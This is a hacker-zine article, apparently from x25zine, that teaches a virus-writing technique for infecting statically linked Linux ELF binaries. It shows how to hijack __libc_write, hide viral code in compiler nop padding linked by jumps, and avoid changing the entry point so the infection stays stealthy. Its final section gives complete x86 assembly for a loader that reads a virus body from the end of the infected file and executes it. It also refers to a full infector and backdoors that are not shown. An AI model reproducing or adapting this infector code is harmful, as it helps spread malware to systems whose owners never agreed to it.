@@ -1,0 +1,310 @@
+                                                               _   _:.
+                                                                :$$$$$
+         _   .     - +.                                        :l$³³$$
+   s¿¿,,_  +:@QSSS$$$$$                                         ``
+   $$$$$$$$bs¿.`"Ù?$$$l    [ Static linked ELF infecting ]   
+   'ÀÀ?$$³$$$$b¿_  .     [ ares ]   
+            `"À$³$b.   .  [ ares@x25zine.org ]  
+                  `À?b.  `.   
+                     `Ù.   +
+                      `$   _.
+                        `
+
+
+ --[ Contents
+
+  1 - Introduction
+  2 - Theory
+  3 - Details
+  4 - Cooking the *loader*
+  5 - Conclusion
+
+
+ --[ 1 - Introduction
+
+ Creative  or stealthy viral infection techniques are practically exhausted. As
+ we've seen over the last  few years, new  techniques have been formulated from
+ old  ones, reworked to fit with modern ABIs. Original ideas were  developed by
+ Windows, but what  examples do we have of UNIX viruses?  Hijacking ELF PLT and
+ GOT,padding,and shared object  or loadable kernel  module  hijacking are a few
+ examples  of  current  technology.  Well  written codes  in  this  field  were
+ published by several groups\persons, such as 29a Labs\z0mbie\sd\silvio.
+
+ In this article, I am  describing my idea for  infecting statically linked ELF
+ binaries. After reading, you can find a complete infector, Scorpion, for  this
+ technique. Bundled, you will find several example back-doors.
+
+ First, a few advantages and drawbacks:
+
+ Advantages  begin  with  symbols. No symbols are needed in this technique, and
+ even stripped files are easily infected. Next, application entry point doesn't
+ change  once  a  binary has been altered. Stealth infection can be achieved by
+ manipulating  the large alignment (nop) fields found in GNU binaries. Finally,
+ in  some  cases,  there  is no increase of binary size after successful binary
+ infection.
+
+ Drawbacks  begin with limitations. The techniques depicted in this article are
+ limited  to the particular construction of static  binaries. Also, there is  a
+ restriction in the  space  available for  injected  virus code, which  depends
+ mostly  on the glibc version.  Since  static  linking isn't  widespread in the
+ wild, we can  say it is useful in specialized situations, where source code is
+ available and we are able to control the process of compilation. In that case,
+ it is feasible to increase the available space by some special option in gcc.
+
+
+ --[ 2 - Theory
+
+ Time  to  go  a  little  deeper  into  the  subject..  let's make some fucking
+ noise!@#$  Since  we  aren't  going to alter the entry point of the binary, we
+ must find another way to get our code executed. Obviously, the virus code must
+ reside somewhere in the text segment, itself; in some function.
+
+ This  function  must  satisfy  a  few  requirements.  First, it must be a libc
+ function in order to be certain it is linked to even the most minimal program.
+ Second,  it  must  have a valid signature that is easily detectable, such as a
+ syscall.  Finally,  the  function  must  have at least seven padding bytes, no
+ operation opcodes, that may be reliably overwritten.
+
+ An example of this is __libc_write:
+
+ 0804c1b0 <__libc_write>:
+ 804c1b0:       53                      push   %ebx
+ 804c1b1:       8b 54 24 10             mov    0x10(%esp,1),%edx
+ 804c1b5:       8b 4c 24 0c             mov    0xc(%esp,1),%ecx
+ 804c1b9:       8b 5c 24 08             mov    0x8(%esp,1),%ebx
+ 804c1bd:       b8 04 00 00 00          mov    $0x4,%eax
+ 804c1c2:       cd 80                   int    $0x80
+ 804c1c4:       5b                      pop    %ebx
+ 804c1c5:       3d 01 f0 ff ff          cmp    $0xfffff001,%eax
+ 804c1ca:       0f 83 90 58 00 00       jae    8051a60 <__syscall_error>
+ 804c1d0:       c3                      ret
+ 804c1d1:       eb 0d                   jmp    804c1e0 <__libc_fcntl>
+ 804c1d3:       90                      nop
+ 804c1d4:       90                      nop
+ 804c1d5:       90                      nop
+ 804c1d6:       90                      nop
+ 804c1d7:       90                      nop
+ 804c1d8:       90                      nop
+ 804c1d9:       90                      nop
+ 804c1da:       90                      nop
+ 804c1db:       90                      nop
+ 804c1dc:       90                      nop
+ 804c1dd:       90                      nop
+ 804c1de:       90                      nop
+ 804c1df:       90                      nop
+
+ This  example, though old, depicts a signature that should be the same for any
+ glibc.  The  signature  consists  of  the  setting up, and calling, of a Linux
+ system call.
+
+ 804c1b0:       53                      push   %ebx
+ 804c1b1:       8b 54 24 10             mov    0x10(%esp,1),%edx
+ 804c1b5:       8b 4c 24 0c             mov    0xc(%esp,1),%ecx
+ 804c1b9:       8b 5c 24 08             mov    0x8(%esp,1),%ebx
+ 804c1bd:       b8 04 00 00 00          mov    $0x4,%eax
+ 804c1c2:       cd 80                   int    $0x80
+
+ Once  we've  found  the  function  in  a  binary, our next move is to relocate
+ __libc_write  to seven bytes further down the opcode stream. This allows us to
+ overwrite  GNU's  padding  with  the  function, itself. It also gives us seven
+ bytes  prefixed  to  __libc_write,  where we will position a call to our viral
+ code.
+
+	movl $address, %eax		; 5 bytes
+	call *eax			; 2 bytes
+
+ With a call in place, the next step is to locate some space to put the body of
+ our  viral code. My first idea was to overwrite a rarely used function such as
+ asnprintf, which is linked to our executable but most likely will not be used.
+ Although,  it  is rather hard to determine signatures for these functions that
+ will persist across glibc versions. So, the most optimal locale for viral code
+ will  be  in  the  alignment  fields  between  functions,  where  GNU  inserts
+ no-operation opcodes. We'll call these alignment fields 'nop fields'.
+
+ The  next goal will be to tag, or track, each nop field, in order to calculate
+ our  cumulative viral space. Each field needs to be greater than, or equal to,
+ thirteen octets in length. This is necessary because we will need to split the
+ virus  into small segments. Thus, it is necessary that each field be connected
+ via  jump  instructions.  Therefore,  one nop field of length greater than, or
+ equal  to,  thirteen  octets allows us to maintain eight payload octets with a
+ five octet jump instruction toward the next infected nop field.
+
+ Now  that  our  method for infection has been laid out in general terms, let's
+ break down the details for a closer look.
+
+ --[ 3 - Details
+
+ The  first problem faced is the lacking amount of nop fields available in very
+ small programs. An obvious example is the typical 'hello world'.
+
+	int
+	main()
+	{
+		printf("hello world\n");
+		return 0;
+	}
+
+ Once  compiled,  there were only two hundred and thirty four octets available,
+ which  equates  to  eight-teen  nop fields. A quick calculation determines the
+ actual amount of payload this gives us.
+
+	TotalBytes - (TotalNopFields * SizeofJump) = TotalPayload
+
+	234 - (18 * 5) = 144;
+
+ Obviously,  one  hundred  and  forty  four  total  payload octets is a minimal
+ amount, and leaves much to be desired.
+
+ Another  problem  occurs  when  we consider an application that performs large
+ amounts   of   writes.  Each  write  call  will  execute  the  viral  payload,
+ substantially  slowing  the application as a whole. Therefore, we must somehow
+ limit the execution of our payload.
+
+ Lastly,  every program, and our virus is no exception, should manage different
+ events. In assembly, an example would look like the following:
+
+	cmpb $value, %reg	; comparison for fault detection
+	jz $offset		; conditional jmp on fault
+
+ Imagine  how  this program flow would be affected if the code were to be split
+ due to a nop field boundary. We would end up with the following:
+
+	Nop Field #1
+		[ code ... 			]
+		[ code ... 			]
+		[ cmpb $value, %reg 	] The original cmpb
+		[ jmp $nop_field_2	] conditional jmp has been deferred
+
+	Nop Field #2
+		[ jz $offset		] Jz branches to invalid offset
+		[ code ...			]
+		[ code ...			]
+		[ jmp $nop_field_3	]
+
+ The conditional jumps can be fixed appropriately, but the work to do it may be
+ un-deserving of our time for our purposes.
+
+ It  would  take too much work to solve these problems in each payload. This is
+ why  I  suggest a special loader is used. This loader will have already solved
+ these  problems  and will simply execute complete viral code from the end of a
+ file.
+
+ --[ 4 - Cooking the Loader
+ 
+	The Loader will work based on the following process:
+
+	1) Back up registers and stack
+	2) Allocate memory
+	3) Check if the payload has already been executed
+	4) Load virus code from end of file
+	5) Execute code
+	6) Reset registers and stack
+	7) Return to infected function
+	8) Continue execution
+
+ /*** start of loader ***/
+ 
+ push %edi     # these registers' data might persist across function boundaries
+ push %esi     #  therefore, they must be backed up explicitly
+
+ # enter
+ #
+ push %ebp       
+ movl %esp,%ebp
+
+ # mmap()
+ #
+ push $0          # I've chosen exact addr 0x50000000 to check for executions.
+ push $-1         # first time we call mmap we get that addr, each new attempt 
+ push $0x21       # will return another value
+ push $3
+ push $1
+ push $0x50000000
+ push %esp
+ pop  %ebx
+ push $90
+ pop  %eax
+ int  $128
+ 
+ cmpl $0x50000000,%eax  # checking
+ 
+ nop            # kinda alignment, to avoid problems with jmp, while splitting
+ nop            # code into parts
+ 
+ je next        # if passed...
+                # if not, return stack\regs and continue function
+ 
+ leave
+ pop  %esi
+ pop  %edi
+ ret
+ 
+ next:
+ xchg %eax,%esi                 # readlink("/proc/self/exe")
+ 
+ push $0x6578
+ push $0x652f666c
+ push $0x65732f63
+ push $0x6f72702f
+ movl %esp,%ebx
+ 
+ push $85
+ pop  %eax
+ push %esi
+ pop  %ecx
+ movb $100,%dl
+ int  $128
+ 
+ xchg %ecx,%ebx
+ 
+ push $5                        # open()
+ pop  %eax
+ xor  %ecx,%ecx
+ int  $128
+ xchg %eax,%edi
+ 
+ push $106                      # stat()
+ pop  %eax
+ push %esi
+ pop  %ecx
+ int  $128
+ 
+ add  $20, %esi
+ movl (%esi),%ecx
+ sub  $0x26,%ecx        # sizeof virus, automatically changing in Scorpion
+ 
+ push $19                       # lseek()
+ pop  %eax
+ push %edi
+ pop  %ebx
+ xor  %edx,%edx
+ int  $128
+ 
+ push $3                        # read() virus to memory
+ pop  %eax
+ push %esi
+ pop  %ecx
+ movb $0x26,%dl
+ int  $128
+  
+ call *%esi                     # execute code
+ 
+ leave
+ pop  %esi
+ pop  %edi
+ ret
+ 
+ /*** end of loader ***/
+ 
+ Because it isn't user-land exec,we aren't able to insert viral code written in
+ C, only pure assembly.The virus should end with leave and ret instructions for
+ a proper return to the infected subroutine.
+ 
+ --[ 5 - Conclusion
+ 
+ Im not about  to describe each details, so that's all. You'll find Scorpion at
+ bonuspack. Thanks to north_ for fixing my english and nice conversations.
+ 
+ Hold on, bye...
+ 
+ 
